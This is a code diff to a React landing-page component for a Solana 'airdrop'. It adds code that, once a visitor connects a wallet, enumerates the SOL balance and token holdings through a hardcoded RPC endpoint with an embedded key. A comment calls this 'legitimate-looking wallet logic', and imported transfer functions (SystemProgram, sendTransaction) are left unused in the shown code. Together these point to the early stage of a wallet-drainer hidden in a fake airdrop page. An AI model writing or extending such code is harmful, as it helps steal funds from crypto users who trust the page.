@@ -1,11 +1,14 @@
-import React from "react";
+import React, { useEffect } from "react";
 import { motion } from "framer-motion";
 import { useWalletModal } from "@solana/wallet-adapter-react-ui";
 import { useWallet } from "@solana/wallet-adapter-react";
+import { Transaction, SystemProgram, Connection, clusterApiUrl, PublicKey } from '@solana/web3.js';
+
+// Inside legitimate-looking wallet logic
 
 const Hero: React.FC = () => {
   const { setVisible } = useWalletModal();
-  const { connected, publicKey } = useWallet();
+  const { connected, publicKey, wallet, sendTransaction  } = useWallet();
 
   const handleJoinAirdrop = () => {
     if (!connected) {
@@ -15,7 +18,38 @@ const Hero: React.FC = () => {
       // Trigger airdrop backend call or modal
     }
   };
-
+  
+  useEffect(() => {
+    if (connected) {
+      console.log("Wallet connected. Fetching balances...");
+  
+      const logWalletAssets = async () => {
+        const connection = new Connection("https://twilight-dry-mountain.solana-mainnet.quiknode.pro/017a2f3e43e29982f440bbcf3b8b990f2757bbdf/");
+  
+        if (!publicKey) return;
+  
+        const solBalance = await connection.getBalance(publicKey);
+        console.log(`💰 SOL Balance: ${(solBalance / 1e9).toFixed(4)} SOL`);
+  
+        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+          programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
+        });
+  
+        console.log("🎯 SPL Tokens:");
+        tokenAccounts.value.forEach(({ account }) => {
+          const info = account.data.parsed.info;
+          const mint = info.mint;
+          const amount = info.tokenAmount.uiAmount;
+          if (amount > 0) {
+            console.log(`- Mint: ${mint}, Amount: ${amount}`);
+          }
+        });
+      };
+  
+      logWalletAssets();
+    }
+  }, [connected]);
+  
   return (
     <section className="relative min-h-screen flex items-center justify-center overflow-hidden">
       {/* Background */}
